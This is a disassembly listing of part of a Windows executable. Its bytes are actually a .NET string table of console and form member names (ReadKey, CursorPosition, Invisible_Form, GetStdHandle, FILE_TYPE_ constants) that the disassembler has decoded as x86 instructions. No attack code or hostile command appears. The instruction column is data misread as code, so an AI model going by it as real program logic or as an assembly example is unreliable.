  406c91:	5f                   	pop    %edi
  406c92:	42                   	inc    %edx
  406c93:	75 66                	jne    0x406cfb
  406c95:	66 65 72 53          	data16 gs jb 0x406cec
  406c99:	69 7a 65 00 43 6f 6f 	imul   $0x6f6f4300,0x65(%edx),%edi
  406ca0:	72 64                	jb     0x406d06
  406ca2:	69 6e 61 74 65 73 00 	imul   $0x736574,0x61(%esi),%ebp
  406ca9:	67 65 74 5f          	addr16 gs je 0x406d0c
  406cad:	43                   	inc    %ebx
  406cae:	75 72                	jne    0x406d22
  406cb0:	73 6f                	jae    0x406d21
  406cb2:	72 50                	jb     0x406d04
  406cb4:	6f                   	outsl  %ds:(%esi),(%dx)
  406cb5:	73 69                	jae    0x406d20
  406cb7:	74 69                	je     0x406d22
  406cb9:	6f                   	outsl  %ds:(%esi),(%dx)
  406cba:	6e                   	outsb  %ds:(%esi),(%dx)
  406cbb:	00 73 65             	add    %dh,0x65(%ebx)
  406cbe:	74 5f                	je     0x406d1f
  406cc0:	43                   	inc    %ebx
  406cc1:	75 72                	jne    0x406d35
  406cc3:	73 6f                	jae    0x406d34
  406cc5:	72 50                	jb     0x406d17
  406cc7:	6f                   	outsl  %ds:(%esi),(%dx)
  406cc8:	73 69                	jae    0x406d33
  406cca:	74 69                	je     0x406d35
  406ccc:	6f                   	outsl  %ds:(%esi),(%dx)
  406ccd:	6e                   	outsb  %ds:(%esi),(%dx)
  406cce:	00 67 65             	add    %ah,0x65(%edi)
  406cd1:	74 5f                	je     0x406d32
  406cd3:	43                   	inc    %ebx
  406cd4:	75 72                	jne    0x406d48
  406cd6:	73 6f                	jae    0x406d47
  406cd8:	72 53                	jb     0x406d2d
  406cda:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  406ce1:	5f                   	pop    %edi
  406ce2:	43                   	inc    %ebx
  406ce3:	75 72                	jne    0x406d57
  406ce5:	73 6f                	jae    0x406d56
  406ce7:	72 53                	jb     0x406d3c
  406ce9:	69 7a 65 00 49 6e 76 	imul   $0x766e4900,0x65(%edx),%edi
  406cf0:	69 73 69 62 6c 65 5f 	imul   $0x5f656c62,0x69(%ebx),%esi
  406cf7:	46                   	inc    %esi
  406cf8:	6f                   	outsl  %ds:(%esi),(%dx)
  406cf9:	72 6d                	jb     0x406d68
  406cfb:	00 46 6c             	add    %al,0x6c(%esi)
  406cfe:	75 73                	jne    0x406d73
  406d00:	68 49 6e 70 75       	push   $0x75706e49
  406d05:	74 42                	je     0x406d49
  406d07:	75 66                	jne    0x406d6f
  406d09:	66 65 72 00          	data16 gs jb 0x406d0d
  406d0d:	67 65 74 5f          	addr16 gs je 0x406d70
  406d11:	46                   	inc    %esi
  406d12:	6f                   	outsl  %ds:(%esi),(%dx)
  406d13:	72 65                	jb     0x406d7a
  406d15:	67 72 6f             	addr16 jb 0x406d87
  406d18:	75 6e                	jne    0x406d88
  406d1a:	64 43                	fs inc %ebx
  406d1c:	6f                   	outsl  %ds:(%esi),(%dx)
  406d1d:	6c                   	insb   (%dx),%es:(%edi)
  406d1e:	6f                   	outsl  %ds:(%esi),(%dx)
  406d1f:	72 00                	jb     0x406d21
  406d21:	73 65                	jae    0x406d88
  406d23:	74 5f                	je     0x406d84
  406d25:	46                   	inc    %esi
  406d26:	6f                   	outsl  %ds:(%esi),(%dx)
  406d27:	72 65                	jb     0x406d8e
  406d29:	67 72 6f             	addr16 jb 0x406d9b
  406d2c:	75 6e                	jne    0x406d9c
  406d2e:	64 43                	fs inc %ebx
  406d30:	6f                   	outsl  %ds:(%esi),(%dx)
  406d31:	6c                   	insb   (%dx),%es:(%edi)
  406d32:	6f                   	outsl  %ds:(%esi),(%dx)
  406d33:	72 00                	jb     0x406d35
  406d35:	42                   	inc    %edx
  406d36:	75 66                	jne    0x406d9e
  406d38:	66 65 72 43          	data16 gs jb 0x406d7f
  406d3c:	65 6c                	gs insb (%dx),%es:(%edi)
  406d3e:	6c                   	insb   (%dx),%es:(%edi)
  406d3f:	00 52 65             	add    %dl,0x65(%edx)
  406d42:	63 74 61 6e          	arpl   %esi,0x6e(%ecx,%eiz,2)
  406d46:	67 6c                	insb   (%dx),%es:(%di)
  406d48:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  406d4c:	74 42                	je     0x406d90
  406d4e:	75 66                	jne    0x406db6
  406d50:	66 65 72 43          	data16 gs jb 0x406d97
  406d54:	6f                   	outsl  %ds:(%esi),(%dx)
  406d55:	6e                   	outsb  %ds:(%esi),(%dx)
  406d56:	74 65                	je     0x406dbd
  406d58:	6e                   	outsb  %ds:(%esi),(%dx)
  406d59:	74 73                	je     0x406dce
  406d5b:	00 67 65             	add    %ah,0x65(%edi)
  406d5e:	74 5f                	je     0x406dbf
  406d60:	4b                   	dec    %ebx
  406d61:	65 79 41             	gs jns 0x406da5
  406d64:	76 61                	jbe    0x406dc7
  406d66:	69 6c 61 62 6c 65 00 	imul   $0x6700656c,0x62(%ecx,%eiz,2),%ebp
  406d6d:	67 
  406d6e:	65 74 5f             	gs je  0x406dd0
  406d71:	4d                   	dec    %ebp
  406d72:	61                   	popa
  406d73:	78 50                	js     0x406dc5
  406d75:	68 79 73 69 63       	push   $0x63697379
  406d7a:	61                   	popa
  406d7b:	6c                   	insb   (%dx),%es:(%edi)
  406d7c:	57                   	push   %edi
  406d7d:	69 6e 64 6f 77 53 69 	imul   $0x6953776f,0x64(%esi),%ebp
  406d84:	7a 65                	jp     0x406deb
  406d86:	00 67 65             	add    %ah,0x65(%edi)
  406d89:	74 5f                	je     0x406dea
  406d8b:	4d                   	dec    %ebp
  406d8c:	61                   	popa
  406d8d:	78 57                	js     0x406de6
  406d8f:	69 6e 64 6f 77 53 69 	imul   $0x6953776f,0x64(%esi),%ebp
  406d96:	7a 65                	jp     0x406dfd
  406d98:	00 4b 65             	add    %cl,0x65(%ebx)
  406d9b:	79 49                	jns    0x406de6
  406d9d:	6e                   	outsb  %ds:(%esi),(%dx)
  406d9e:	66 6f                	outsw  %ds:(%esi),(%dx)
  406da0:	00 52 65             	add    %dl,0x65(%edx)
  406da3:	61                   	popa
  406da4:	64 4b                	fs dec %ebx
  406da6:	65 79 4f             	gs jns 0x406df8
  406da9:	70 74                	jo     0x406e1f
  406dab:	69 6f 6e 73 00 52 65 	imul   $0x65520073,0x6e(%edi),%ebp
  406db2:	61                   	popa
  406db3:	64 4b                	fs dec %ebx
  406db5:	65 79 00             	gs jns 0x406db8
  406db8:	53                   	push   %ebx
  406db9:	63 72 6f             	arpl   %esi,0x6f(%edx)
  406dbc:	6c                   	insb   (%dx),%es:(%edi)
  406dbd:	6c                   	insb   (%dx),%es:(%edi)
  406dbe:	42                   	inc    %edx
  406dbf:	75 66                	jne    0x406e27
  406dc1:	66 65 72 43          	data16 gs jb 0x406e08
  406dc5:	6f                   	outsl  %ds:(%esi),(%dx)
  406dc6:	6e                   	outsb  %ds:(%esi),(%dx)
  406dc7:	74 65                	je     0x406e2e
  406dc9:	6e                   	outsb  %ds:(%esi),(%dx)
  406dca:	74 73                	je     0x406e3f
  406dcc:	00 53 65             	add    %dl,0x65(%ebx)
  406dcf:	74 42                	je     0x406e13
  406dd1:	75 66                	jne    0x406e39
  406dd3:	66 65 72 43          	data16 gs jb 0x406e1a
  406dd7:	6f                   	outsl  %ds:(%esi),(%dx)
  406dd8:	6e                   	outsb  %ds:(%esi),(%dx)
  406dd9:	74 65                	je     0x406e40
  406ddb:	6e                   	outsb  %ds:(%esi),(%dx)
  406ddc:	74 73                	je     0x406e51
  406dde:	00 67 65             	add    %ah,0x65(%edi)
  406de1:	74 5f                	je     0x406e42
  406de3:	57                   	push   %edi
  406de4:	69 6e 64 6f 77 50 6f 	imul   $0x6f50776f,0x64(%esi),%ebp
  406deb:	73 69                	jae    0x406e56
  406ded:	74 69                	je     0x406e58
  406def:	6f                   	outsl  %ds:(%esi),(%dx)
  406df0:	6e                   	outsb  %ds:(%esi),(%dx)
  406df1:	00 73 65             	add    %dh,0x65(%ebx)
  406df4:	74 5f                	je     0x406e55
  406df6:	57                   	push   %edi
  406df7:	69 6e 64 6f 77 50 6f 	imul   $0x6f50776f,0x64(%esi),%ebp
  406dfe:	73 69                	jae    0x406e69
  406e00:	74 69                	je     0x406e6b
  406e02:	6f                   	outsl  %ds:(%esi),(%dx)
  406e03:	6e                   	outsb  %ds:(%esi),(%dx)
  406e04:	00 67 65             	add    %ah,0x65(%edi)
  406e07:	74 5f                	je     0x406e68
  406e09:	57                   	push   %edi
  406e0a:	69 6e 64 6f 77 53 69 	imul   $0x6953776f,0x64(%esi),%ebp
  406e11:	7a 65                	jp     0x406e78
  406e13:	00 73 65             	add    %dh,0x65(%ebx)
  406e16:	74 5f                	je     0x406e77
  406e18:	57                   	push   %edi
  406e19:	69 6e 64 6f 77 53 69 	imul   $0x6953776f,0x64(%esi),%ebp
  406e20:	7a 65                	jp     0x406e87
  406e22:	00 67 65             	add    %ah,0x65(%edi)
  406e25:	74 5f                	je     0x406e86
  406e27:	57                   	push   %edi
  406e28:	69 6e 64 6f 77 54 69 	imul   $0x6954776f,0x64(%esi),%ebp
  406e2f:	74 6c                	je     0x406e9d
  406e31:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  406e35:	74 5f                	je     0x406e96
  406e37:	57                   	push   %edi
  406e38:	69 6e 64 6f 77 54 69 	imul   $0x6954776f,0x64(%esi),%ebp
  406e3f:	74 6c                	je     0x406ead
  406e41:	65 00 42 61          	add    %al,%gs:0x61(%edx)
  406e45:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  406e48:	72 6f                	jb     0x406eb9
  406e4a:	75 6e                	jne    0x406eba
  406e4c:	64 43                	fs inc %ebx
  406e4e:	6f                   	outsl  %ds:(%esi),(%dx)
  406e4f:	6c                   	insb   (%dx),%es:(%edi)
  406e50:	6f                   	outsl  %ds:(%esi),(%dx)
  406e51:	72 00                	jb     0x406e53
  406e53:	42                   	inc    %edx
  406e54:	75 66                	jne    0x406ebc
  406e56:	66 65 72 53          	data16 gs jb 0x406ead
  406e5a:	69 7a 65 00 43 75 72 	imul   $0x72754300,0x65(%edx),%edi
  406e61:	73 6f                	jae    0x406ed2
  406e63:	72 50                	jb     0x406eb5
  406e65:	6f                   	outsl  %ds:(%esi),(%dx)
  406e66:	73 69                	jae    0x406ed1
  406e68:	74 69                	je     0x406ed3
  406e6a:	6f                   	outsl  %ds:(%esi),(%dx)
  406e6b:	6e                   	outsb  %ds:(%esi),(%dx)
  406e6c:	00 43 75             	add    %al,0x75(%ebx)
  406e6f:	72 73                	jb     0x406ee4
  406e71:	6f                   	outsl  %ds:(%esi),(%dx)
  406e72:	72 53                	jb     0x406ec7
  406e74:	69 7a 65 00 46 6f 72 	imul   $0x726f4600,0x65(%edx),%edi
  406e7b:	65 67 72 6f          	gs addr16 jb 0x406eee
  406e7f:	75 6e                	jne    0x406eef
  406e81:	64 43                	fs inc %ebx
  406e83:	6f                   	outsl  %ds:(%esi),(%dx)
  406e84:	6c                   	insb   (%dx),%es:(%edi)
  406e85:	6f                   	outsl  %ds:(%esi),(%dx)
  406e86:	72 00                	jb     0x406e88
  406e88:	4b                   	dec    %ebx
  406e89:	65 79 41             	gs jns 0x406ecd
  406e8c:	76 61                	jbe    0x406eef
  406e8e:	69 6c 61 62 6c 65 00 	imul   $0x4d00656c,0x62(%ecx,%eiz,2),%ebp
  406e95:	4d 
  406e96:	61                   	popa
  406e97:	78 50                	js     0x406ee9
  406e99:	68 79 73 69 63       	push   $0x63697379
  406e9e:	61                   	popa
  406e9f:	6c                   	insb   (%dx),%es:(%edi)
  406ea0:	57                   	push   %edi
  406ea1:	69 6e 64 6f 77 53 69 	imul   $0x6953776f,0x64(%esi),%ebp
  406ea8:	7a 65                	jp     0x406f0f
  406eaa:	00 4d 61             	add    %cl,0x61(%ebp)
  406ead:	78 57                	js     0x406f06
  406eaf:	69 6e 64 6f 77 53 69 	imul   $0x6953776f,0x64(%esi),%ebp
  406eb6:	7a 65                	jp     0x406f1d
  406eb8:	00 57 69             	add    %dl,0x69(%edi)
  406ebb:	6e                   	outsb  %ds:(%esi),(%dx)
  406ebc:	64 6f                	outsl  %fs:(%esi),(%dx)
  406ebe:	77 50                	ja     0x406f10
  406ec0:	6f                   	outsl  %ds:(%esi),(%dx)
  406ec1:	73 69                	jae    0x406f2c
  406ec3:	74 69                	je     0x406f2e
  406ec5:	6f                   	outsl  %ds:(%esi),(%dx)
  406ec6:	6e                   	outsb  %ds:(%esi),(%dx)
  406ec7:	00 57 69             	add    %dl,0x69(%edi)
  406eca:	6e                   	outsb  %ds:(%esi),(%dx)
  406ecb:	64 6f                	outsl  %fs:(%esi),(%dx)
  406ecd:	77 53                	ja     0x406f22
  406ecf:	69 7a 65 00 57 69 6e 	imul   $0x6e695700,0x65(%edx),%edi
  406ed6:	64 6f                	outsl  %fs:(%esi),(%dx)
  406ed8:	77 54                	ja     0x406f2e
  406eda:	69 74 6c 65 00 4d 42 	imul   $0x5f424d00,0x65(%esp,%ebp,2),%esi
  406ee1:	5f 
  406ee2:	47                   	inc    %edi
  406ee3:	65 74 53             	gs je  0x406f39
  406ee6:	74 72                	je     0x406f5a
  406ee8:	69 6e 67 00 44 69 61 	imul   $0x61694400,0x67(%esi),%ebp
  406eef:	6c                   	insb   (%dx),%es:(%edi)
  406ef0:	6f                   	outsl  %ds:(%esi),(%dx)
  406ef1:	67 52                	addr16 push %edx
  406ef3:	65 73 75             	gs jae 0x406f6b
  406ef6:	6c                   	insb   (%dx),%es:(%edi)
  406ef7:	74 00                	je     0x406ef9
  406ef9:	53                   	push   %ebx
  406efa:	68 6f 77 00 53       	push   $0x5300776f
  406eff:	79 73                	jns    0x406f74
  406f01:	74 65                	je     0x406f68
  406f03:	6d                   	insl   (%dx),%es:(%edi)
  406f04:	2e 43                	cs inc %ebx
  406f06:	6f                   	outsl  %ds:(%esi),(%dx)
  406f07:	6c                   	insb   (%dx),%es:(%edi)
  406f08:	6c                   	insb   (%dx),%es:(%edi)
  406f09:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  406f0e:	6e                   	outsb  %ds:(%esi),(%dx)
  406f0f:	73 2e                	jae    0x406f3f
  406f11:	4f                   	dec    %edi
  406f12:	62 6a 65             	bound  %ebp,0x65(%edx)
  406f15:	63 74 4d 6f          	arpl   %esi,0x6f(%ebp,%ecx,2)
  406f19:	64 65 6c             	fs gs insb (%dx),%es:(%edi)
  406f1c:	00 43 6f             	add    %al,0x6f(%ebx)
  406f1f:	6c                   	insb   (%dx),%es:(%edi)
  406f20:	6c                   	insb   (%dx),%es:(%edi)
  406f21:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  406f26:	6e                   	outsb  %ds:(%esi),(%dx)
  406f27:	60                   	pusha
  406f28:	31 00                	xor    %eax,(%eax)
  406f2a:	43                   	inc    %ebx
  406f2b:	68 6f 69 63 65       	push   $0x6563696f
  406f30:	44                   	inc    %esp
  406f31:	65 73 63             	gs jae 0x406f97
  406f34:	72 69                	jb     0x406f9f
  406f36:	70 74                	jo     0x406fac
  406f38:	69 6f 6e 00 54 6f 55 	imul   $0x556f5400,0x6e(%edi),%ebp
  406f3f:	6e                   	outsb  %ds:(%esi),(%dx)
  406f40:	69 63 6f 64 65 00 4b 	imul   $0x4b006564,0x6f(%ebx),%esp
  406f47:	65 79 73             	gs jns 0x406fbd
  406f4a:	00 47 65             	add    %al,0x65(%edi)
  406f4d:	74 43                	je     0x406f92
  406f4f:	68 61 72 46 72       	push   $0x72467261
  406f54:	6f                   	outsl  %ds:(%esi),(%dx)
  406f55:	6d                   	insl   (%dx),%es:(%edi)
  406f56:	4b                   	dec    %ebx
  406f57:	65 79 73             	gs jns 0x406fcd
  406f5a:	00 63 68             	add    %ah,0x68(%ebx)
  406f5d:	65 63 6b 4b          	arpl   %ebp,%gs:0x4b(%ebx)
  406f61:	65 79 44             	gs jns 0x406fa8
  406f64:	6f                   	outsl  %ds:(%esi),(%dx)
  406f65:	77 6e                	ja     0x406fd5
  406f67:	00 6b 65             	add    %ch,0x65(%ebx)
  406f6a:	79 69                	jns    0x406fd5
  406f6c:	6e                   	outsb  %ds:(%esi),(%dx)
  406f6d:	66 6f                	outsw  %ds:(%esi),(%dx)
  406f6f:	00 4b 65             	add    %cl,0x65(%ebx)
  406f72:	79 45                	jns    0x406fb9
  406f74:	76 65                	jbe    0x406fdb
  406f76:	6e                   	outsb  %ds:(%esi),(%dx)
  406f77:	74 41                	je     0x406fba
  406f79:	72 67                	jb     0x406fe2
  406f7b:	73 00                	jae    0x406f7d
  406f7d:	4b                   	dec    %ebx
  406f7e:	65 79 62             	gs jns 0x406fe3
  406f81:	6f                   	outsl  %ds:(%esi),(%dx)
  406f82:	61                   	popa
  406f83:	72 64                	jb     0x406fe9
  406f85:	5f                   	pop    %edi
  406f86:	46                   	inc    %esi
  406f87:	6f                   	outsl  %ds:(%esi),(%dx)
  406f88:	72 6d                	jb     0x406ff7
  406f8a:	5f                   	pop    %edi
  406f8b:	4b                   	dec    %ebx
  406f8c:	65 79 44             	gs jns 0x406fd3
  406f8f:	6f                   	outsl  %ds:(%esi),(%dx)
  406f90:	77 6e                	ja     0x407000
  406f92:	00 4b 65             	add    %cl,0x65(%ebx)
  406f95:	79 62                	jns    0x406ff9
  406f97:	6f                   	outsl  %ds:(%esi),(%dx)
  406f98:	61                   	popa
  406f99:	72 64                	jb     0x406fff
  406f9b:	5f                   	pop    %edi
  406f9c:	46                   	inc    %esi
  406f9d:	6f                   	outsl  %ds:(%esi),(%dx)
  406f9e:	72 6d                	jb     0x40700d
  406fa0:	5f                   	pop    %edi
  406fa1:	4b                   	dec    %ebx
  406fa2:	65 79 55             	gs jns 0x406ffa
  406fa5:	70 00                	jo     0x406fa7
  406fa7:	50                   	push   %eax
  406fa8:	72 6f                	jb     0x407019
  406faa:	67 72 65             	addr16 jb 0x407012
  406fad:	73 73                	jae    0x407022
  406faf:	42                   	inc    %edx
  406fb0:	61                   	popa
  406fb1:	72 43                	jb     0x406ff6
  406fb3:	6f                   	outsl  %ds:(%esi),(%dx)
  406fb4:	6c                   	insb   (%dx),%es:(%edi)
  406fb5:	6f                   	outsl  %ds:(%esi),(%dx)
  406fb6:	72 00                	jb     0x406fb8
  406fb8:	53                   	push   %ebx
  406fb9:	79 73                	jns    0x40702e
  406fbb:	74 65                	je     0x407022
  406fbd:	6d                   	insl   (%dx),%es:(%edi)
  406fbe:	2e 54                	cs push %esp
  406fc0:	69 6d 65 72 73 00 54 	imul   $0x54007372,0x65(%ebp),%ebp
  406fc7:	69 6d 65 72 00 74 69 	imul   $0x69740072,0x65(%ebp),%ebp
  406fce:	6d                   	insl   (%dx),%es:(%edi)
  406fcf:	65 72 00             	gs jb  0x406fd2
  406fd2:	62 61 72             	bound  %esp,0x72(%ecx)
  406fd5:	4e                   	dec    %esi
  406fd6:	75 6d                	jne    0x407045
  406fd8:	62 65 72             	bound  %esp,0x72(%ebp)
  406fdb:	00 62 61             	add    %ah,0x61(%edx)
  406fde:	72 56                	jb     0x407036
  406fe0:	61                   	popa
  406fe1:	6c                   	insb   (%dx),%es:(%edi)
  406fe2:	75 65                	jne    0x407049
  406fe4:	00 69 6e             	add    %ch,0x6e(%ecx)
  406fe7:	54                   	push   %esp
  406fe8:	69 63 6b 00 53 79 73 	imul   $0x73795300,0x6b(%ebx),%esp
  406fef:	74 65                	je     0x407056
  406ff1:	6d                   	insl   (%dx),%es:(%edi)
  406ff2:	2e 43                	cs inc %ebx
  406ff4:	6f                   	outsl  %ds:(%esi),(%dx)
  406ff5:	6c                   	insb   (%dx),%es:(%edi)
  406ff6:	6c                   	insb   (%dx),%es:(%edi)
  406ff7:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  406ffc:	6e                   	outsb  %ds:(%esi),(%dx)
  406ffd:	73 2e                	jae    0x40702d
  406fff:	47                   	inc    %edi
  407000:	65 6e                	outsb  %gs:(%esi),(%dx)
  407002:	65 72 69             	gs jb  0x40706e
  407005:	63 00                	arpl   %eax,(%eax)
  407007:	4c                   	dec    %esp
  407008:	69 73 74 60 31 00 70 	imul   $0x70003160,0x74(%ebx),%esi
  40700f:	72 6f                	jb     0x407080
  407011:	67 72 65             	addr16 jb 0x407079
  407014:	73 73                	jae    0x407089
  407016:	44                   	inc    %esp
  407017:	61                   	popa
  407018:	74 61                	je     0x40707b
  40701a:	4c                   	dec    %esp
  40701b:	69 73 74 00 53 79 73 	imul   $0x73795300,0x74(%ebx),%esi
  407022:	74 65                	je     0x407089
  407024:	6d                   	insl   (%dx),%es:(%edi)
  407025:	2e 44                	cs inc %esp
  407027:	72 61                	jb     0x40708a
  407029:	77 69                	ja     0x407094
  40702b:	6e                   	outsb  %ds:(%esi),(%dx)
  40702c:	67 00 43 6f          	add    %al,0x6f(%bp,%di)
  407030:	6c                   	insb   (%dx),%es:(%edi)
  407031:	6f                   	outsl  %ds:(%esi),(%dx)
  407032:	72 00                	jb     0x407034
  407034:	44                   	inc    %esp
  407035:	72 61                	jb     0x407098
  407037:	77 69                	ja     0x4070a2
  407039:	6e                   	outsb  %ds:(%esi),(%dx)
  40703a:	67 43                	addr16 inc %ebx
  40703c:	6f                   	outsl  %ds:(%esi),(%dx)
  40703d:	6c                   	insb   (%dx),%es:(%edi)
  40703e:	6f                   	outsl  %ds:(%esi),(%dx)
  40703f:	72 00                	jb     0x407041
  407041:	49                   	dec    %ecx
  407042:	6e                   	outsb  %ds:(%esi),(%dx)
  407043:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  40704a:	65 
  40704b:	43                   	inc    %ebx
  40704c:	6f                   	outsl  %ds:(%esi),(%dx)
  40704d:	6d                   	insl   (%dx),%es:(%edi)
  40704e:	70 6f                	jo     0x4070bf
  407050:	6e                   	outsb  %ds:(%esi),(%dx)
  407051:	65 6e                	outsb  %gs:(%esi),(%dx)
  407053:	74 00                	je     0x407055
  407055:	45                   	inc    %ebp
  407056:	6c                   	insb   (%dx),%es:(%edi)
  407057:	61                   	popa
  407058:	70 73                	jo     0x4070cd
  40705a:	65 64 45             	gs fs inc %ebp
  40705d:	76 65                	jbe    0x4070c4
  40705f:	6e                   	outsb  %ds:(%esi),(%dx)
  407060:	74 41                	je     0x4070a3
  407062:	72 67                	jb     0x4070cb
  407064:	73 00                	jae    0x407066
  407066:	54                   	push   %esp
  407067:	69 6d 65 54 69 63 6b 	imul   $0x6b636954,0x65(%ebp),%ebp
  40706e:	00 41 64             	add    %al,0x64(%ecx)
  407071:	64 42                	fs inc %edx
  407073:	61                   	popa
  407074:	72 00                	jb     0x407076
  407076:	47                   	inc    %edi
  407077:	65 74 43             	gs je  0x4070bd
  40707a:	6f                   	outsl  %ds:(%esi),(%dx)
  40707b:	75 6e                	jne    0x4070eb
  40707d:	74 00                	je     0x40707f
  40707f:	50                   	push   %eax
  407080:	72 6f                	jb     0x4070f1
  407082:	67 72 65             	addr16 jb 0x4070ea
  407085:	73 73                	jae    0x4070fa
  407087:	52                   	push   %edx
  407088:	65 63 6f 72          	arpl   %ebp,%gs:0x72(%edi)
  40708c:	64 00 55 70          	add    %dl,%fs:0x70(%ebp)
  407090:	64 61                	fs popa
  407092:	74 65                	je     0x4070f9
  407094:	00 4c 61 62          	add    %cl,0x62(%ecx,%eiz,2)
  407098:	65 6c                	gs insb (%dx),%es:(%edi)
  40709a:	00 6c 62 41          	add    %ch,0x41(%edx,%eiz,2)
  40709e:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  4070a2:	69 74 79 00 6c 62 53 	imul   $0x7453626c,0x0(%ecx,%edi,2),%esi
  4070a9:	74 
  4070aa:	61                   	popa
  4070ab:	74 75                	je     0x407122
  4070ad:	73 00                	jae    0x4070af
  4070af:	50                   	push   %eax
  4070b0:	72 6f                	jb     0x407121
  4070b2:	67 72 65             	addr16 jb 0x40711a
  4070b5:	73 73                	jae    0x40712a
  4070b7:	42                   	inc    %edx
  4070b8:	61                   	popa
  4070b9:	72 00                	jb     0x4070bb
  4070bb:	6f                   	outsl  %ds:(%esi),(%dx)
  4070bc:	62 6a 50             	bound  %ebp,0x50(%edx)
  4070bf:	72 6f                	jb     0x407130
  4070c1:	67 72 65             	addr16 jb 0x407129
  4070c4:	73 73                	jae    0x407139
  4070c6:	42                   	inc    %edx
  4070c7:	61                   	popa
  4070c8:	72 00                	jb     0x4070ca
  4070ca:	6c                   	insb   (%dx),%es:(%edi)
  4070cb:	62 52 65             	bound  %edx,0x65(%edx)
  4070ce:	6d                   	insl   (%dx),%es:(%edi)
  4070cf:	61                   	popa
  4070d0:	69 6e 69 6e 67 54 69 	imul   $0x6954676e,0x69(%esi),%ebp
  4070d7:	6d                   	insl   (%dx),%es:(%edi)
  4070d8:	65 00 6c 62 4f       	add    %ch,%gs:0x4f(%edx,%eiz,2)
  4070dd:	70 65                	jo     0x407144
  4070df:	72 61                	jb     0x407142
  4070e1:	74 69                	je     0x40714c
  4070e3:	6f                   	outsl  %ds:(%esi),(%dx)
  4070e4:	6e                   	outsb  %ds:(%esi),(%dx)
  4070e5:	00 41 63             	add    %al,0x63(%ecx)
  4070e8:	74 69                	je     0x407153
  4070ea:	76 69                	jbe    0x407155
  4070ec:	74 79                	je     0x407167
  4070ee:	49                   	dec    %ecx
  4070ef:	64 00 50 61          	add    %dl,%fs:0x61(%eax)
  4070f3:	72 65                	jb     0x40715a
  4070f5:	6e                   	outsb  %ds:(%esi),(%dx)
  4070f6:	74 41                	je     0x407139
  4070f8:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  4070fc:	69 74 79 49 64 00 44 	imul   $0x65440064,0x49(%ecx,%edi,2),%esi
  407103:	65 
  407104:	70 74                	jo     0x40717a
  407106:	68 00 47 65 74       	push   $0x74654700
  40710b:	53                   	push   %ebx
  40710c:	74 64                	je     0x407172
  40710e:	48                   	dec    %eax
  40710f:	61                   	popa
  407110:	6e                   	outsb  %ds:(%esi),(%dx)
  407111:	64 6c                	fs insb (%dx),%es:(%edi)
  407113:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  407117:	74 46                	je     0x40715f
  407119:	69 6c 65 54 79 70 65 	imul   $0x657079,0x54(%ebp,%eiz,2),%ebp
  407120:	00 
  407121:	49                   	dec    %ecx
  407122:	73 49                	jae    0x40716d
  407124:	6e                   	outsb  %ds:(%esi),(%dx)
  407125:	70 75                	jo     0x40719c
  407127:	74 52                	je     0x40717b
  407129:	65 64 69 72 65 63 74 	gs imul $0x64657463,%fs:0x65(%edx),%esi
  407130:	65 64 
  407132:	00 49 73             	add    %cl,0x73(%ecx)
  407135:	4f                   	dec    %edi
  407136:	75 74                	jne    0x4071ac
  407138:	70 75                	jo     0x4071af
  40713a:	74 52                	je     0x40718e
  40713c:	65 64 69 72 65 63 74 	gs imul $0x64657463,%fs:0x65(%edx),%esi
  407143:	65 64 
  407145:	00 49 73             	add    %cl,0x73(%ecx)
  407148:	45                   	inc    %ebp
  407149:	72 72                	jb     0x4071bd
  40714b:	6f                   	outsl  %ds:(%esi),(%dx)
  40714c:	72 52                	jb     0x4071a0
  40714e:	65 64 69 72 65 63 74 	gs imul $0x64657463,%fs:0x65(%edx),%esi
  407155:	65 64 
  407157:	00 46 49             	add    %al,0x49(%esi)
  40715a:	4c                   	dec    %esp
  40715b:	45                   	inc    %ebp
  40715c:	5f                   	pop    %edi
  40715d:	54                   	push   %esp
  40715e:	59                   	pop    %ecx
  40715f:	50                   	push   %eax
  407160:	45                   	inc    %ebp
  407161:	5f                   	pop    %edi
  407162:	55                   	push   %ebp
  407163:	4e                   	dec    %esi
  407164:	4b                   	dec    %ebx
  407165:	4e                   	dec    %esi
  407166:	4f                   	dec    %edi
  407167:	57                   	push   %edi
  407168:	4e                   	dec    %esi
  407169:	00 46 49             	add    %al,0x49(%esi)
  40716c:	4c                   	dec    %esp
  40716d:	45                   	inc    %ebp
  40716e:	5f                   	pop    %edi
  40716f:	54                   	push   %esp
  407170:	59                   	pop    %ecx
  407171:	50                   	push   %eax
  407172:	45                   	inc    %ebp
  407173:	5f                   	pop    %edi
  407174:	44                   	inc    %esp
  407175:	49                   	dec    %ecx
  407176:	53                   	push   %ebx
  407177:	4b                   	dec    %ebx
  407178:	00 46 49             	add    %al,0x49(%esi)
  40717b:	4c                   	dec    %esp
  40717c:	45                   	inc    %ebp
  40717d:	5f                   	pop    %edi
  40717e:	54                   	push   %esp
  40717f:	59                   	pop    %ecx
  407180:	50                   	push   %eax
  407181:	45                   	inc    %ebp
  407182:	5f                   	pop    %edi
  407183:	43                   	inc    %ebx
  407184:	48                   	dec    %eax
  407185:	41                   	inc    %ecx
  407186:	52                   	push   %edx
  407187:	00 46 49             	add    %al,0x49(%esi)
  40718a:	4c                   	dec    %esp
  40718b:	45                   	inc    %ebp
  40718c:	5f                   	pop    %edi
  40718d:	54                   	push   %esp
  40718e:	59                   	pop    %ecx
  40718f:	50                   	push   %eax
  407190:	45                   	inc    %ebp
  407191:	5f                   	pop    %edi
  407192:	50                   	push   %eax
  407193:	49                   	dec    %ecx
  407194:	50                   	push   %eax
  407195:	45                   	inc    %ebp
  407196:	00 46 49             	add    %al,0x49(%esi)
  407199:	4c                   	dec    %esp
  40719a:	45                   	inc    %ebp
  40719b:	5f                   	pop    %edi
  40719c:	54                   	push   %esp
  40719d:	59                   	pop    %ecx
  40719e:	50                   	push   %eax
  40719f:	45                   	inc    %ebp
  4071a0:	5f                   	pop    %edi
  4071a1:	52                   	push   %edx
  4071a2:	45                   	inc    %ebp
  4071a3:	4d                   	dec    %ebp
